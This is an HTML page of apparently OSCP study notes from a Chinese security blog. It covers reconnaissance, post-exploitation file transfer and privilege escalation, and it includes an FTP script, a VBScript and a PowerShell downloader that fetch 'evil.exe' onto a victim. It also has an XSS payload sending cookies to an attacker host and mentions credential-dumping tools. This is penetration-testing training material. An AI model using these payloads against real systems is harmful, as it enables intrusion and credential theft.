@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="OSCP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="如果你的英语听力真的很赞，那直接看视频吧。个人建议直接拿起PDF进行阅读实操。">
+<meta name="keywords" content="OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP学习总结">
+<meta property="og:url" content="/2018-01-07-Oscp-Learn/index.html">
+<meta property="og:site_name" content="Security blog">
+<meta property="og:description" content="如果你的英语听力真的很赞，那直接看视频吧。个人建议直接拿起PDF进行阅读实操。">
+<meta property="og:updated_time" content="2018-01-22T14:02:45.902Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="OSCP学习总结">
+<meta name="twitter:description" content="如果你的英语听力真的很赞，那直接看视频吧。个人建议直接拿起PDF进行阅读实操。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2018-01-07-Oscp-Learn/"/>
+
+
+
+
+
+  <title>OSCP学习总结 | Security blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2018-01-07-Oscp-Learn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ꭰ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">OSCP学习总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-07T22:16:27+08:00">
+                2018-01-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetation-Test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetation Test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>如果你的英语听力真的很赞，那直接看视频吧。个人建议直接拿起<em>PDF</em>进行阅读实操。<a id="more"></a></p>
+<h3 id="Intelligence-Gather"><a href="#Intelligence-Gather" class="headerlink" title="Intelligence-Gather"></a><em>Intelligence-Gather</em></h3><h4 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h4><p><em>nc -unvv -w 1 -z 192.168.31.227 160-165</em></p>
+<p>-z用于扫描模式</p>
+<p>-w超时时间设置</p>
+<p>nbtscan 扫描</p>
+<p>enum4linux 扫描</p>
+<h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p><em>SNMP</em>采用<em>UDP</em>协议进行数据传输，端口默认为<em>161</em>。</p>
+<p><em>mib-values</em>默认值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.3.6.1.2.1.25.1.6.0  System Process</div><div class="line">1.3.6.1.2.1.25.4.2.1.2 Running Programs</div><div class="line">1.3.6.1.2.1.25.4.2.1.4 Processes Path</div><div class="line">1.3.6.1.2.1.25.2.3.1.4 Storage Units</div><div class="line">1.3.6.1.2.1.25.6.3.1.2 SoftName</div><div class="line">1.3.6.1.4.1.77.1.2.25  User Accounts</div><div class="line">1.3.6.1.2.1.6.13.1.3   TCP Local Ports</div></pre></td></tr></table></figure>
+<p>可以使用如下命令对目标机器进行批量扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ namp <span class="_">-s</span>U --open -p 161 192.168.1.200-254 --open</div></pre></td></tr></table></figure>
+<p>在<em>kali</em>上还有一款名为<em>onesixtyone</em>工具用于<em>snmp</em>。<em>SNMP</em>默认有三个团体名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">public</div><div class="line">private</div><div class="line">manager</div></pre></td></tr></table></figure>
+<p>将上述默认团体名保存为<em>community</em>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onesixtyone -c community -i iplist</div></pre></td></tr></table></figure>
+<p>通过上述命令，我们可以获取到<em>SNMP</em>的信息。</p>
+<h5 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a><em>snmpwalk</em></h5><p>通过<em>onesixtyone</em>获取到基本的信息后，我们可以使用<em>snmpwalk</em>来获取更详细的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ snmpwalk -c public -v1[protcol version] ip</div></pre></td></tr></table></figure>
+<p>比如说使用下面这条命令获取开放端口信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ snmpwalk -c public -v1 ip $(head -n 7 community | tail -n 1 | cut <span class="_">-d</span> <span class="string">" "</span> <span class="_">-f</span>1)</div></pre></td></tr></table></figure>
+<p>或者获取目标机器的用户名信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ snmpwalk -c public -v1 ip $(head -n 5 community | tail -n 1 | cut <span class="_">-d</span> <span class="string">" "</span> <span class="_">-f</span>1)</div></pre></td></tr></table></figure>
+<h3 id="Vulnerability-Scanner"><a href="#Vulnerability-Scanner" class="headerlink" title="Vulnerability Scanner"></a><em>Vulnerability Scanner</em></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nmap --script [scripts | locate /usr/share/nmap/scripts ]</div></pre></td></tr></table></figure>
+<p><em>Openvas</em>是一款开源的风险评估系统工具，在<em>kali</em>中我们需要先进行安装才能使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ openvas-setup</div></pre></td></tr></table></figure>
+<h3 id="如何找到Secure-shellcode"><a href="#如何找到Secure-shellcode" class="headerlink" title="如何找到Secure shellcode"></a><em>如何找到Secure shellcode</em></h3><p><em>SecurityFocus</em></p>
+<p><em>kali</em>内置了一款<em>searchsploit</em>工具，用于<em>exploit</em>的寻找。</p>
+<h4 id="网络的exploit"><a href="#网络的exploit" class="headerlink" title="网络的exploit"></a>网络的<em>exploit</em></h4><p>如果<em>exp</em>中出现了<em>windows</em>的<em>library</em>，我们可以在kali上先安装<em>mingw32</em>，然后进行<em>cross-compile</em>即可。</p>
+<h3 id="Post-Exploit之文件上传"><a href="#Post-Exploit之文件上传" class="headerlink" title="Post Exploit之文件上传"></a><em>Post Exploit</em>之文件上传</h3><p>当你拿到了<em>shell</em>后，下一步就是扩大自己对目标机器的控制程度。如果目标机器是<em>Linux</em>的话，我们可以使用<em>Linux</em>内置的<em>ncat</em>、<em>curl</em>、<em>wget</em>工具进行远程下载我们的<em>maclious</em>文件。如果目标机器是<em>windows</em>，则可以通过<em>tftp</em>或者<em>ftp</em>来传输文件进行后门安装。</p>
+<p><strong><em>TFTP</em></strong></p>
+<p>在<em>Kali</em>上进行<em>TFTP</em>的搭建，<em>Victim</em>机上进行连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ atftpd --dameon --port [port] /Filefolder</div></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tftp -i ip GET[action] Filename</div></pre></td></tr></table></figure>
+<p>如果目标机上不存在<em>tftp</em>，可以尝试<em>ftp</em>进行上传。</p>
+<p><strong><em>TFP</em></strong></p>
+<p>在<em>kali</em>上安装<em>pure-ftpd</em>并运行<em>ftp</em>，使用<em>ftp</em>有两个好处，一是<em>windows</em>内置该命令，二是<em>ftp</em>可以通过<em>no-interactive</em>来执行命令，所以我们采用如下指令进行文件上传。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> open 10.11.0.78 21 &gt; ftp.txt</div><div class="line"><span class="built_in">echo</span> offsec &gt;&gt; ftp.txt   <span class="comment"># offsec is the username</span></div><div class="line"><span class="built_in">echo</span> lab &gt;&gt; ftp.txt      <span class="comment"># lab is the password</span></div><div class="line"><span class="built_in">echo</span> bin &gt;&gt; ftp.txt</div><div class="line"><span class="built_in">echo</span> GET evil.exe &gt;&gt; ftp.txt  <span class="comment"># download your tools</span></div><div class="line"><span class="built_in">echo</span> <span class="built_in">bye</span> &gt;&gt; ftp.txt		 <span class="comment"># disconnected from your vps</span></div><div class="line">ftp <span class="_">-s</span>:ftp.txt</div></pre></td></tr></table></figure>
+<p><strong><em>VBScript</em></strong></p>
+<p>如果以上还不能满足你的需求，可以尝试<em>VBScript</em>来上传文件。下面是一个简单的<em>vbs</em>脚本，执行简单的<em>wget</em>功能。在反弹出来的<em>shell</em>上执行如下命令</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">echo strUrl = WScript.Arguments.Item(<span class="number">0</span>) &gt; wget.vbs</div><div class="line">echo StrFile = WScript.Arguments.Item(<span class="number">1</span>) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Const</span> HTTPREQUEST_PROXYSETTING_DEFAULT = <span class="number">0</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Const</span> HTTPREQUEST_PROXYSETTING_PRECONFIG = <span class="number">0</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Const</span> HTTPREQUEST_PROXYSETTING_DIRECT = <span class="number">1</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Const</span> HTTPREQUEST_PROXYSETTING_PROXY = <span class="number">2</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Dim</span> http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</div><div class="line">echo <span class="built_in">Err</span>.Clear &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Set</span> http = <span class="literal">Nothing</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">If</span> http <span class="keyword">Is</span> <span class="literal">Nothing</span> <span class="keyword">Then</span> <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"WinHttp.WinHttpRequest"</span>) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">If</span> http <span class="keyword">Is</span> <span class="literal">Nothing</span> <span class="keyword">Then</span> <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"MSXML2.ServerXMLHTTP"</span>) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">If</span> http <span class="keyword">Is</span> <span class="literal">Nothing</span> <span class="keyword">Then</span> <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"Microsoft.XMLHTTP"</span>) &gt;&gt; wget.vbs</div><div class="line">echo http.Open <span class="string">"GET"</span>,strURL,<span class="literal">False</span> &gt;&gt; wget.vbs</div><div class="line">echo http.Send &gt;&gt; wget.vbs</div><div class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Set</span> http = <span class="literal">Nothing</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Set</span> fs = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Set</span> ts = fs.CreateTextFile(StrFile,<span class="literal">True</span>) &gt;&gt; wget.vbs</div><div class="line">echo strData = <span class="string">""</span> &gt;&gt; wget.vbs</div><div class="line">echo strBuffer = <span class="string">""</span> &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">For</span> lngCounter = <span class="number">0</span> <span class="keyword">to</span> <span class="built_in">UBound</span>(varByteArray) &gt;&gt; wget.vbs</div><div class="line">echo ts.Write <span class="built_in">Chr</span>(<span class="number">255</span> <span class="keyword">And</span> Ascb(Midb(varByteArray,lngCounter + <span class="number">1</span>,<span class="number">1</span>))) &gt;&gt; wget.vbs</div><div class="line">echo <span class="keyword">Next</span> &gt;&gt; wget.vbs</div><div class="line">echo ts.Close &gt;&gt; wget.vbs</div></pre></td></tr></table></figure>
+<p>接着在当前<em>shell</em>环境中下载远程机器上的恶意文件。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript wget.vbs http://xxx.com/evil.exe  evil.exe</div></pre></td></tr></table></figure>
+<p>然后，你想干啥就干啥喽。</p>
+<p><strong><em>Powershell</em></strong></p>
+<p>思路和<em>VbScript</em>一样，先在目标机器上写个<em>powershell</em>脚本，然后通过该脚本下载恶意文件。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">echo <span class="variable">$storageDir</span> = <span class="variable">$pwd</span> &gt; wget.ps1</div><div class="line">echo <span class="variable">$webclient</span> = <span class="built_in">New-Object</span> System.Net.WebClient &gt;&gt;wget.ps1</div><div class="line">echo <span class="variable">$url</span> = <span class="string">"http://10.11.0.5/evil.exe"</span> &gt;&gt;wget.ps1</div><div class="line">echo <span class="variable">$file</span> = <span class="string">"new-exploit.exe"</span> &gt;&gt;wget.ps1</div><div class="line">echo <span class="variable">$webclient</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>) &gt;&gt;wget.ps1</div></pre></td></tr></table></figure>
+<p>接着通过<em>powershell.exe</em>来执行命令即可</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</div></pre></td></tr></table></figure>
+<p><strong><em>Debug.exe</em></strong></p>
+<p>该方式的思路仍然和上述一样，唯一的不同点是针对32位<em>Windows</em>进行的。这里简单的提下思路，因为<em>debug.exe</em>工具对文件的大小有<em>64K</em>要求，故而需要先将要穿上的文件压缩下，以<em>nc</em>为例，使用<em>upx</em>进行压缩。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ upx -9 nc.exe</div></pre></td></tr></table></figure>
+<p>接着使用<em>exe2bat</em>将<em>exe</em>文件转为txt格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cp /usr/share/windows-binaries/exe2bat.exe</div><div class="line">$ wine exe2bat.exe nc.exe nc.txt</div></pre></td></tr></table></figure>
+<p>接着在<em>shell</em>执行<em>nc.txt</em>即可完成上传过程</p>
+<h3 id="Post-Exploit之Privilege-Escalation"><a href="#Post-Exploit之Privilege-Escalation" class="headerlink" title="Post Exploit之Privilege Escalation"></a>Post Exploit之Privilege Escalation</h3><h4 id="Target-Machine为Linux"><a href="#Target-Machine为Linux" class="headerlink" title="Target Machine为Linux"></a><em>Target Machine为Linux</em></h4><h4 id="Target-Machine为Windows"><a href="#Target-Machine为Windows" class="headerlink" title="Target Machine为Windows"></a><em>Target Machine为Windows</em></h4><p>场景一：<em>exp</em>为<em>python</em>脚本，目标机器上并没有<em>py</em>环境。</p>
+<p>解决思路：在本地使用<em>pyinstall.py</em>模块在本地进行转换</p>
+<p>其他语言的解决思路也是如此</p>
+<p>在真实的场景里，直接使用<em>exp</em>进行提权的场景可能比较少，管理员可能都及时安装了补丁。这个时候应该从配置文件角度出发去查看安全风险。大致有以下几个攻击点可以作为参考。</p>
+<ol>
+<li>某个<em>service</em>读取的文件可供所有人查看和编辑（<em>windows</em>可以通过<em>icacls</em>命令来查看）</li>
+<li><em>dump</em>服务器的<em>SAM</em>文件</li>
+<li>使用<a href="http://www.tarasco.org/security/Process_Injector/" target="_blank" rel="external"><em>Process Injector</em></a>来进行进程注入</li>
+<li>通过<a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" target="_blank" rel="external">未进行正确配置的引号服务路径来提权</a></li>
+</ol>
+<h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><p>客户端攻击不同于服务器应用的攻击（比如POP3，FTP服务器），这种攻击形式不再是端口扫描探测爆破。作为<em>attacker</em>，你需要更全面的<em>Intelligence Gathering</em>，因为一台服务器的保护对管理员来说是非常容易的。</p>
+<p>对于客户端攻击来说，需要结合<em>phishing</em>与其他的漏洞，比如<em>office</em>的<em>0day</em>等。</p>
+<p><strong><em>场景一：</em></strong>通过信息收集获取到了目标机器的浏览器信息，并确认存在<em>MS12-037</em>漏洞，这时可以伪造邮件给用户。但如果目标机器处于独立的内网，出外网的流量是受监控的，攻击的角度该如何处理？</p>
+<p>如何将<em>payload</em>变得更加可信？</p>
+<h3 id="Web应用攻击"><a href="#Web应用攻击" class="headerlink" title="Web应用攻击"></a>Web应用攻击</h3><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><em>XSS</em></h4><p>通过<em>XSS</em>重定向用户获取信息，比如浏览器版本、cookie信息。大致思路是利用<em>javascript</em>代码向<em>attacker</em>服务器发送<em>cookie</em>信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ nc -lvp 80</div><div class="line">...</div></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image()</div><div class="line">img.src = <span class="string">"http://attacker/output="</span> + <span class="built_in">document</span>.cookie</div><div class="line">doucument.body.append(img)</div></pre></td></tr></table></figure>
+<p><em>XSS</em>的其他攻击思路，能否攻击服务器或者客户端网站？</p>
+<h4 id="FI-Vulneriailities"><a href="#FI-Vulneriailities" class="headerlink" title="FI Vulneriailities"></a><em>FI Vulneriailities</em></h4><p>文件包含漏洞（<em>File Inclusion</em>）包括<em>Rmote</em>和<em>Local</em>两种类型。该漏洞常见于<em>PHP</em>代码中，之前有篇文章《<a href="">文件读取漏洞利用思路</a>》介绍了一次渗透过程遇到的<em>Java</em>文件包含漏洞。<em>PHP</em>中常见的文件包含漏洞通常是由<em>register_globals</em>和<em>allow_url</em>引起。<em>Remote</em>和<em>Local</em>的本质区别是<em>Remote</em>允许<em>attacker</em>访问事先准备好的<em>malcious</em>文件，而<em>Local</em>仅限于目标机器的本地文件读取。</p>
+<p><strong><em>Tips</em></strong></p>
+<p><em>PHP version below 5.3 we can terminate our request with null byte %00 that would cause php engine to ignore everything after that byte</em></p>
+<h3 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a><em>Password Attacks</em></h3><p><em>Kali</em>中有款工具叫做<em>crunch</em>，该工具能够生成字典，基本用法可以参见<em>man page</em>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ crunch 4 6 0123456789 -o word.list</div></pre></td></tr></table></figure>
+<p>针对特殊的公司，或者<em>APT</em>时，选择<em>Brute Force</em>是一个不错的思路，但是前提是个性化信息收集。这里可以结合<em>cewl</em>这款工具来获取<em>website</em>上的信息。</p>
+<h4 id="获取windows哈希密码"><a href="#获取windows哈希密码" class="headerlink" title="获取windows哈希密码"></a>获取<em>windows</em>哈希密码</h4><p>对于<em>Windows-NT</em>来说，它存储了两种不同的<em>hash</em>密码。<em>LM</em>和<em>NTLM</em>。操作系统默认是使用<em>NTLM</em>而禁止<em>LM</em>的。尽管如此，<em>NTLM</em>仍未进行加盐处理。</p>
+<p>在<em>windows</em>上有两款工具可以获得<em>Windows</em>的<em>hash</em>密码，一款是<em>Pwdump</em>，另一款是<em>fgdump</em>。原理都很简单，就是通过注入<em>DLL</em>到<em>LSASS(Local Security Authority Subsystem)</em>进程中，因为<em>LSASS</em>进程拥有能够获取密码哈希的<em>API</em>。</p>
+<h4 id="获取windows明文密码"><a href="#获取windows明文密码" class="headerlink" title="获取windows明文密码"></a>获取<em>windows</em>明文密码</h4><p><em>Windows Credentials Editor</em>是一款能够获取<em>Windows</em>明文密码的工具，除此之外，它还能直接偷取身份信息。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018-01-05-Depth-1-Vulnhub/" rel="next" title="Depth 1-Vulnhub">
+                <i class="fa fa-chevron-left"></i> Depth 1-Vulnhub
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018-01-12-Remote-File-Inclusion/" rel="prev" title="文件读取漏洞利用思路">
+                文件读取漏洞利用思路 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ꭰ</p>
+              <p class="site-description motion-element" itemprop="description">Me. a lazy person</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jkme.github.io" title="jkme" target="_blank">jkme</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
